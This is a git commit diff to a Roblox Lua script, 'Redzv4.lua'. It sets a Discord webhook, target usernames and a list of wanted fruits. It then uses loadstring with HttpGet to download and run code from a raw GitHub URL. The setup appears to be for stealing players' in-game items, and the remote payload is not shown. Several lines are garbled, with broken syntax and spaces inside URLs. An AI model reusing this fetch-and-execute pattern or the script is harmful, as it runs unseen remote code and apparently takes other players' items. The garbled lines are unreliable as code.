0196b6e945b86a770e26e7be03edbf7bfcb78829
Realredzhubv4 <154838098+lakshaya372@users.noreply.github.com>
2025-03-11 01:16:47 +0530

    Update Redzv4.lua

--- Redzv4.lua
+++ Redzv4.lua
@@ -1,21 +1,7 @@
-Webhook =
+Webhook = "" -- << Your Webhook
 
-<< Your Webhook
+Usernames = {"uruserhereorsmthidk", "somealtuserhere2"} --<< Your username(-s).
 
-Usernames =
+Fruits ToHit ("Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"}-- << Fruits you want
 
-{"uruserhereorsmthidk", "somealtuserhere2"} username(-s). << Your
-
-{"Kitsune-Kitsune",
-
-Fruits ToHit = "Gas-Gas"} <<< Fruits you want
-
-"Leopard-Leopard", "Yeti-Yeti",
-
-loadstring(game: HttpGet("https: //raw.githubusercontent.com /surelyco/CutestCodes/refs/heads /main/V2"))()
-
-Webhook = "" << Your Webhook Usernames = {"uruserhereorsmthidk", "somealtuserhere2"} username(-s). << Your
-
-Fruits ToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} << Fruits you want
-
-loadstring(game:HttpGet("https://raw .githubusercontent.com/surelyco /CutestCodes/refs/heads/main/V2"))()
+loadstring(game: HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
